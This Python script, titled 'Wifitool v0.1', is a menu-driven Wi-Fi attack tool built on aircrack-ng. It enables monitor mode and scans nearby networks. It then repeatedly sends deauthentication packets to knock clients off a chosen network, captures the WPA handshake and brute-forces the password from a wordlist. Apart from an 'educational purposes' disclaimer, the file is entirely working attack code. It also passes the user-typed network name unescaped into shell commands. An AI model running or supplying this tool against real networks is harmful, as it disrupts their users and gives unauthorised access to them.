```python script.py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import subprocess
import time
import signal
import threading
import shutil
from pathlib import Path

# Global variables
current_progress = 0
ctrlc_pressed = False
wireless_card = ""
wireless_card_monitormode = ""
target_name = ""
target_bssid = ""
target_channel_number = ""


# Ctrl+C handler
def signal_handler(sig, frame):
    global ctrlc_pressed
    ctrlc_pressed = True
    print("\n[!] Ctrl+C signal received")


# Function to run system commands
def run_command(cmd, silent=False, title=""):
    try:
        if title and not silent:
            print(f"\n[{title}]")

        if silent:
            result = subprocess.run(cmd, shell=True,
                                    stdout=subprocess.DEVNULL,
                                    stderr=subprocess.DEVNULL)
        else:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            return result.stdout.strip()
        return ""
    except Exception as e:
        print(f"[-] Command execution error: {e}")
        return ""


# Cleanup and restore function
def first_run_fix():
    print("[*] Restoring after previous run...")

    # Detect monitor interface
    cmd = "iw dev | grep 'Interface' | grep 'mon' | awk '{print $2}'"
    mon_interface = run_command(cmd)

    if mon_interface:
        run_command(f"sudo airmon-ng stop {mon_interface}", silent=True)
        run_command(f"sudo ifconfig {mon_interface} up", silent=True)

    # Remove temporary files
    if os.path.exists("tmp"):
        shutil.rmtree("tmp")

    csv_files = [f for f in os.listdir(".") if f.endswith(".csv")]
    for file in csv_files:
        try:
            os.remove(file)
        except:
            pass

    # Detect wireless interface
    cmd = "iw dev | grep 'Interface' | head -n 1 | awk '{print $2}'"
    global wireless_card, wireless_card_monitormode
    wireless_card = run_command(cmd)
    wireless_card_monitormode = f"{wireless_card}mon"

    print(f"[+] Using interface: {wireless_card}")


# Progress bar function
def progress(percent):
    global current_progress
    current_progress = percent
    os.system("clear")

    bar_length = 50
    filled_length = int(bar_length * percent / 100)

    bar = "[" + "=" * filled_length + ">" + " " * (bar_length - filled_length) + "]"
    print(f"\n{bar} {percent}%\n")


# Help function
def help_func():
    global current_progress
    progress(current_progress)

    print("\n[1] Check and install required components.")
    print("[2] Put network card into monitor mode.")
    print("[3] Scan Wi-Fi networks.")
    print("[4] Capture handshake.")
    print("[5] Brute-force password\n")
    return 0


# Check required components
def check_func():
    progress(5)
    print("\nChecking required components...")

    required_tools = ["aircrack-ng", "xterm", "iw"]

    for tool in required_tools:
        if run_command(f"which {tool}", silent=True):
            print(f"[+] {tool} - installed")
        else:
            print(f"[-] {tool} - missing")
            print(f"[*] Installing {tool}...")

            if tool == "aircrack-ng":
                run_command("sudo apt-get update && sudo apt-get install -y aircrack-ng", silent=True)
            elif tool == "xterm":
                run_command("sudo apt-get update && sudo apt-get install -y xterm", silent=True)

    progress(10)
    print("\n[!] All components checked! You can continue.\n")


# Enable monitor mode
def monitor_func():
    progress(15)
    print("\n[*] Enabling monitor mode...")

    run_command("sudo airmon-ng check kill", silent=True, title="Stopping interfering processes")
    progress(20)

    run_command(f"sudo airmon-ng start {wireless_card}", silent=True, title="Starting monitor mode")
    progress(25)

    print("\n[+] Done! Use [3] to scan Wi-Fi networks.\n")


# Scan networks
def sniff_func():
    global target_name, target_bssid, target_channel_number

    # Start scanning in a separate thread
    def sniff_thread():
        cmd = f"timeout 9 sudo airodump-ng {wireless_card_monitormode} --output-format=csv -w nets.csv --write-interval 3"
        run_command(cmd, silent=True, title="Scanning Wi-Fi networks")

    thread = threading.Thread(target=sniff_thread)
    thread.start()

    # Progress animation
    for i in range(33):
        progress(3 * i)
        time.sleep(0.26)

    thread.join()
    progress(60)

    # Parse results
    if not os.path.exists("nets.csv-01.csv"):
        print("[-] Could not find scan results")
        return False

    print("\n[+] Found networks:\n")

    # Simple network list output
    cmd = "cat nets.csv-01.csv | sed -n '/Station/q;p' | sed '/Last time seen/d' | awk -F',' '{print $14}' | awk '{$1=$1};1' | sed -r '/^\\s*$/d'"
    networks = run_command(cmd)

    if networks:
        print(networks)
    else:
        print("[-] Could not retrieve network list")
        return False

    # Select network
    target_name = input("\n[?] Enter network name (case-sensitive): ").strip()

    if not target_name:
        print("[-] Network name not specified")
        return False

    progress(70)

    # Create temp directory
    os.makedirs("tmp", exist_ok=True)

    # Extract network info
    cmd = f"cat nets.csv-01.csv | sed -n '/Station/q;p' | sed '/Last time seen/d' | grep '{target_name}'"

    # Network name
    netname_cmd = cmd + " | awk -F',' '{print $14}' > tmp/netname.txt"
    run_command(netname_cmd, silent=True)

    # BSSID
    netbssid_cmd = cmd + " | awk -F',' '{print $1}' > tmp/netbssid.txt"
    run_command(netbssid_cmd, silent=True)

    # Channel
    channel_cmd = cmd + " | awk -F',' '{print $4}' > tmp/channel.txt"
    run_command(channel_cmd, silent=True)

    # Read data from files
    try:
        with open("tmp/netname.txt", "r") as f:
            target_name = f.read().strip()

        with open("tmp/netbssid.txt", "r") as f:
            target_bssid = f.read().strip()

        with open("tmp/channel.txt", "r") as f:
            target_channel_number = f.read().strip()
    except:
        print("[-] Error reading network data")
        return False

    print(f"\n[+] Selected network: {target_name}")
    print(f"[+] Network MAC: {target_bssid}")
    print(f"[+] Channel: {target_channel_number}")
    print("\n[+] Data saved! You can now capture handshake using [4].\n")

    return True


# Listen to selected network
def deauth_func():
    global ctrlc_pressed

    if not all([target_bssid, target_channel_number, target_name]):
        print("[-] First scan networks using [3]")
        return False

    print("\n[*] Starting to listen on selected network...")

    # Start airodump-ng in separate thread
    def airodump_thread():
        cap_file = f"tmp/{target_name}.cap"
        cmd = f"sudo airodump-ng {wireless_card_monitormode} --bssid={target_bssid} -c {target_channel_number} -w {cap_file}"
        run_command(cmd, silent=True, title="Listening to network")

    thread = threading.Thread(target=airodump_thread)
    thread.daemon = True
    thread.start()

    # Channel setup animation
    print("\n[*] Setting up network channel...")
    for _ in range(15):
        for anim in ["[)].", "[|]..", "[(]...", "[|].."]:
            print(f"\r{anim}", end="", flush=True)
            time.sleep(0.1)

    progress(80)
    print("\n[!] Press Ctrl+C once you've captured the handshake\n")

    # Deauthentication loop
    signal.signal(signal.SIGINT, signal_handler)

    try:
        while not ctrlc_pressed:
            print("[*] Sending deauthentication packets...")

            deauth_cmd = f"sudo aireplay-ng --deauth 7 -a {target_bssid} {wireless_card_monitormode}"
            run_command(deauth_cmd, silent=True, title="Deauthentication")

            time.sleep(6)
    except KeyboardInterrupt:
        ctrlc_pressed = True

    progress(90)
    print("\n[+] Handshake captured (assumed). Run [5] to start password cracking.\n")
    return True


# Crack password
def crack_func():
    if not os.path.exists("list.txt"):
        print("[-] File list.txt not found")
        print("[*] Create list.txt with passwords")
        return False

    cap_files = list(Path("tmp").glob("*.cap"))
    if not cap_files:
        print("[-] No .cap handshake files found")
        print("[*] First capture handshake using [4]")
        return False

    cap_file = cap_files[0]
    print(f"\n[*] Handshake file found: {cap_file}")

    print("\n[*] Starting password cracking...")
    cmd = f"sudo aircrack-ng -w list.txt {cap_file}"
    run_command(cmd, title="Cracking password")

    # Copy handshake file
    try:
        shutil.copy(cap_file, ".")
        print(f"\n[+] Handshake file copied to current directory: {cap_file.name}")
    except:
        print("[-] Could not copy handshake file")

    progress(100)
    print("\n[+] Program completed!")

    # Cleanup
    first_run_fix()
    return True


# Main menu
def main():
    os.system("clear")
    signal.signal(signal.SIGINT, signal_handler)

    # Initialization
    first_run_fix()
    progress(0)

    print("\n                   Wifitool v0.1 (Python version)")
    print("\n\n[!] Warning!")
    print("This program is for educational/demonstration purposes only.")
    print("We are not responsible for your actions.")
    print("\n[?] Enter '0' or '?' for help.\n")

    while True:
        try:
            user_input = input("WiFi Tool: ").strip()

            if user_input in ["0", "?"]:
                help_func()
            elif user_input == "1":
                check_func()
            elif user_input == "2":
                monitor_func()
            elif user_input == "3":
                sniff_func()
            elif user_input == "4":
                deauth_func()
            elif user_input == "5":
                crack_func()
            else:
                print("[-] Command not recognized. Enter [0] or [?] for help.\n")
        except KeyboardInterrupt:
            print("\n\n[!] Exiting program...")
            first_run_fix()
            sys.exit(0)
        except Exception as e:
            print(f"[-] Error: {e}")


if __name__ == "__main__":
    # Check for admin privileges
    if os.geteuid() != 0:
        print("[!] This program requires administrator privileges (sudo)")
        print("[*] Run: sudo python3 script.py")
        sys.exit(1)

    main()
